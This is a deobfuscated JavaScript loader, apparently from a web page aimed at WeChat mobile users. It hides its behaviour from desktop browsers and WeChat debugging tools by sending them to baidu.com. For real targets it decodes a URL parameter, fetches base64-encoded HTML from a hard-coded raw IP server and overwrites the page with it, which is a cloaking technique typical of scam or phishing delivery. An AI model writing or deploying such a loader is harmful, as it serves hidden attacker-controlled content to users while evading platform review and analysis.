//Mon Nov 04 2024 09:53:19 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
var ua = navigator.userAgent.toLowerCase(),
  isj = navigator.platform.toLowerCase();
function getLw() {
  var _0x26801d = new RegExp("#", "g"),
    _0x52c2ce = top.location.search + top.location.hash.replace(_0x26801d, "&"),
    _0x37820d = new RegExp("(^|&|/?)lw=([^&#]*)(&|$|#)", "i"),
    _0x1704b = _0x52c2ce.substr(1).match(_0x37820d),
    _0x51b136;
  try {
    _0x51b136 = window.atob(_0x1704b[2]);
  } catch (_0x3261e7) {
    location.href = "http://www.baidu.com";
  }
  return _0x51b136.split(",");
}
if (isj.indexOf("win") < 0 && isj.indexOf("mac") < 0 && ua.indexOf("wxdebugger") < 0 && ua.indexOf("wechatdevtools") < 0 && ua.indexOf("windowswechat") < 0 && ua.match(/MicroMessenger/i) == "micromessenger") {
  var lw = getLw(),
    url = "http://43.139.29.225:8080/api/a/" + lw[1];
  function render() {
    html = Base64.decode(html.substr(3));
    var _0x4eab2f = document.open("text/html", "replace");
    _0x4eab2f.write(html);
    _0x4eab2f.close();
    document.getElementById("loading").style.display = "none";
  }
  var html = null,
    xhr = new XMLHttpRequest();
  xhr.open("GET", url, false);
  xhr.onreadystatechange = function () {
    if (this.status == 200 && this.readyState == 4) html = xhr.responseText, render();else this.status == 404 && alert("网络异常！");
  };
  xhr.send();
} else location.href = "http://www.baidu.com";